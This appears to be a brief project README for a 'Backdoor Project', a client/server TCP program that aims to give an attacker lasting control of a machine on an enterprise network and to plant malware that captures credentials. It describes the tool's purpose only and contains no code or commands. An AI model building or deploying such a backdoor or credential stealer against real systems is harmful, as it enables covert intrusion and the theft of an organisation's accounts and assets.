### Backdoor Project

This project consist in create a bind between two machines and take total control like a shadow. This program shows a connection Client / Server into a Network Enterprise. In any Network connection only needs an input door to scale until to get relevant information. However, a Backdoor can create multiple connections and it can take possession of assets more important of an enterprise and so the attacker can go and go out anytime.<br>

But in this project, the connection will be only one to one (client / server) with a tcp protocol and introduces malware to get credentials.<br><br>
